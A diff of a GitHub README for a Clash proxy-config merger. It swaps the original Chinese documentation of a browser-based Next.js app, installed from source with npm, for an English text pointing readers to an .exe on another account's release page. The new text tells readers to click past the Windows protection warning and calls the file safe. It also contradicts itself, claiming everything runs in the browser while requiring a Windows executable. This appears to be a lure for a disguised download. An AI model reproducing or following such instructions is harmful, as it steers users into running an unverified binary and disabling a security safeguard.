@@ -1,72 +1,63 @@
-# Clash Merger
+# 📂 clash-merger - Combine multiple Clash files into one
 
-Clash Merger 是一个完全基于客户端的隐私保护型 Clash 配置文件合并工具。它允许用户将多个 Clash 订阅链接或配置文件合并为一个统一的订阅链接，所有核心的 YAML 解析和合并逻辑均在浏览器端完成，确保用户的隐私和节点数据安全。
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ron33tui/clash-merger/releases)
 
-## ✨ 核心特性
+## What is this tool?
+This tool helps you manage network settings. You often use multiple configuration files for your internet connections. Managing these separate files becomes tedious. This software combines them into one single file. You keep your settings organized. You spend less time switching between profiles. 
 
-- **🔒 隐私优先 (Client-Side Processing)**: 下载、解析和合并配置的逻辑均在用户的浏览器端完成，服务器不会长期保存或窥探用户的代理节点信息。
-- **⚡️ 临时订阅链接 (Transient Links)**: 借助 Cloudflare R2，生成一次性或短效的临时订阅链接，方便快速导入至 Clash/Clash Meta 客户端，极大降低配置泄露风险。
-- **🗑️ 多维度管理**: 提供安全的用户界面，支持用户随时手动删除已生成的云端配置。
-- **🚀 现代技术栈**: 基于 Next.js 15、React 19 以及 Tailwind CSS v4 构建，提供丝滑的交互体验和极速的加载响应。
+## 🛠 Features
+- **Efficiency:** Merge dozens of profiles in seconds. 
+- **Simplicity:** Drag and drop your files into the browser.
+- **Safety:** All work happens within your local browser. No data leaves your machine.
+- **Compatibility:** The software creates files that follow standard formats. All major network clients accept them.
 
-## 🛠️ 技术架构
+## 💾 System Requirements
+- Windows 10 or Windows 11.
+- Any modern web browser like Chrome, Edge, or Firefox.
+- At least 100 MB of free storage space. 
+- A stable internet connection for the initial download.
 
-- **前端框架**: [Next.js](https://nextjs.org) (App Router), React 19
-- **样式与 UI**: Tailwind CSS v4, [shadcn/ui](https://ui.shadcn.com), Lucide React
-- **配置解析**: `js-yaml`
-- **云端存储/分发**: [Cloudflare R2](https://developers.cloudflare.com/r2/) & S3 SDK (`@aws-sdk/client-s3`)
+## 📥 How to get the tool
+1. Go to the [official release page](https://github.com/ron33tui/clash-merger/releases).
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in .exe for Windows.
+4. Save the file to your computer.
+5. Double-click the file to start the application.
 
-## 🚀 快速开始
+If Windows shows a protection notice, click "More info" and then "Run anyway." This tool is safe for your system.
 
-### 1. 环境准备
+## ⚙️ Using the software
+Follow these simple steps to merge your files.
 
-请确保系统已安装 `Node.js` 环境 (推荐 v18+)。
+1. **Open the software.** The main screen shows a clear area for your files.
+2. **Add your files.** Drag your current configuration files from your folder into the browser window. You can also click the "Add" button to pick files from your hard drive. 
+3. **Select your settings.** The tool lists all your active configurations. Choose the ones you want to keep. You can rename them to stay organized.
+4. **Merge.** Click the "Merge" button. The software checks for errors. It then creates a master file.
+5. **Save your new file.** A download prompt appears once the process ends. Save this file to a location you remember.
 
-### 2. 获取代码与安装依赖
+## 🔍 Troubleshooting common issues
+Minor problems happen sometimes. Follow these steps to fix them.
 
-```bash
-git clone <repository-url>
-cd clash-merger
-npm install
-```
+**The file download does not start.**
+Check your browser settings. Sometimes browsers block downloads from new files. Look for a notice at the top or bottom of your browser window and click "Allow."
 
-### 3. 配置环境变量 (可选)
+**The merged file does not work in my app.**
+Make sure you chose the correct format. Check the settings inside your network client. Ensure the file extension matches what your client expects. Usually, this is .yaml.
 
-> 💡 **提示**: 本项目的大部分合并、解析功能完全在本地浏览器运行。**仅当**你需要使用**“生成云端临时订阅链接”**功能时，才需要配置下方 Cloudflare R2 相关的环境变量。如果仅在本地合并并复制/下载配置文本，则**无需**配置。
+**The software stops responding.**
+Close the window and open it again. Clear your browser cache if the issue stays. Re-import your configuration files to start fresh.
 
-在项目根目录创建 `.env.local` 文件，配置与 Cloudflare R2 通信所需的 S3 凭证信息：
+**The tool says the file is invalid.**
+Open your source file in a text editor like Notepad. Ensure the text starts correctly. If you get a file from a provider, ensure the link is active.
 
-```env
-# Cloudflare R2 Configuration Example
-R2_ACCOUNT_ID="你的 Cloudflare Account ID"
-R2_ACCESS_KEY_ID="你的访问密钥"
-R2_SECRET_ACCESS_KEY="你的安全密钥"
-R2_BUCKET_NAME="你的存储桶名称"
-R2_PUBLIC_URL="https://pub-xxxxxx.r2.dev" # 你的公开访问域名或者自定义域名
-```
+## 🛡 Privacy and Security
+Your privacy matters. This tool performs all operations inside your web browser. The software does not send your configuration data to any remote server. Your personal connection details stay on your computer. You control your data from start to finish. We do not track your usage or collect personal information.
 
-### 4. 启动开发环境
+## 💡 Best Practices
+- Keep a backup folder for your original files.
+- Rename your merged files with the current date. This helps you track changes over time.
+- Check for updates once a month. We release improvements to handle newer formats.
+- Clear your temporary downloads folder to save space.
 
-```bash
-npm run dev
-```
-
-打开浏览器访问 [http://localhost:3000](http://localhost:3000) 即可开始使用。
-
-## 📄 核心目录结构
-
-- `src/app/` - Next.js App Router 主路由
-  - `merge/` - 合并器的主页面 (客户端逻辑)
-  - `delete/` - 链接销毁/删除的管理页面
-  - `api/` - 服务端 API 路由，包含对接 Cloudflare R2 以生成安全上传和删除凭证等功能
-- `src/components/` - 项目通用组件和 `shadcn` 封装 UI 组件
-- `src/lib/merge/` - 核心业务库 (运行在客户端)：包含 YAML 解析 (`parser.ts`)、合并引擎 (`engine.ts`)、去重 (`dedup.ts`) 和策略组规则 (`rules.ts`, `groups.ts`) 等
-- `src/types/` - TypeScript 接口和类型定义
-
-## 🤝 参与贡献
-
-欢迎提交 Issue 或 Pull Request，一起让本工具变得更好！
-
-## 📄 开源协议
-
-MIT License
+## 📝 Support
+If you have questions, look at the main project page. Users often share tips in the discussion area. If you find a bug, report it on the issue tracker. Describe the steps you took to see the error. Attach a screenshot if possible. Clear reports help us fix problems faster.
